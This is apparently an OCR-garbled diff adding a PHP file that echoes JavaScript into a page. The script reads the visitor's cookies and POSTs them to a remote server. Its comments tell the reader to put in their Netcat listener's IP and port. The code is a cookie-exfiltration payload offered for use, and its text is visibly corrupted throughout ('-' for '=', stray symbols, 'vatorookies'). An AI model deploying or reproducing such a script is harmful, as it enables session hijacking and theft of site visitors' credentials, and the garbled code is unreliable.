@@ -1,0 +1,28 @@
+‹Pphp
+// PHP code to conditionally include JavaScript
+$showAlert - true; // Set this to true to show the alert
+ュ（$showAlert）t
+// Note: Change the IP and port to your Netcat listener's address and port
+§remoteServer - 'http://localhost:9999/remote-php'; // Replace with your Netcat server's IP and port
+// Properly escape the URL to prevent injection issues
+SescapedRemoteServer - htmlspecialchars(SremoteServer, ENT_QUOTES, 'UTF-8");
+echo '‹script type-"text/javascript*> (function()
+vatorookies - document-cookie;
+// Send
+cookies to the remote server
+fetch("*
+• $escapedRemoteServer - method:
+"POST",
+headers : {
+"Content-Type: *application/x-www-form-urlencoded*
+body: cookies-" + encodeURIComponent (cookies)
+• then (response »> response.text))
+-then (data => €
+console. log("Data sent to the server:", data);
+• catcherror »> (
+console-error ("Error sending data:", error);
+3)3
+205:
+</scripty">';
+}
+?>
